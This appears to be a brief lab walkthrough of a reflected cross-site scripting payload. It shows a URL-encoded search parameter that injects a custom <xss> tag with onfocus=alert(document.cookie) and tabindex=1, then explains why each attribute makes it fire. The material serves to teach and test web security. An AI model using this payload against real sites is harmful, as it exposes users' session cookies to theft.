Inject a custom element: <xss>

Attach an event handler (onfocus)

Auto-trigger alert(document.cookie)


The encoded search parameter

Inside URL:
%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E


Decoded URL:
<xss id=x onfocus=alert(document.cookie) tabindex=1>


Why this works:
<xss>

Custom tag → browser accepts it.

id=x

Gives element an anchor target.

onfocus=alert(document.cookie)

When element gains focus → XSS fires.

tabindex=1

Makes element focusable.

Without this, onfocus never fires.
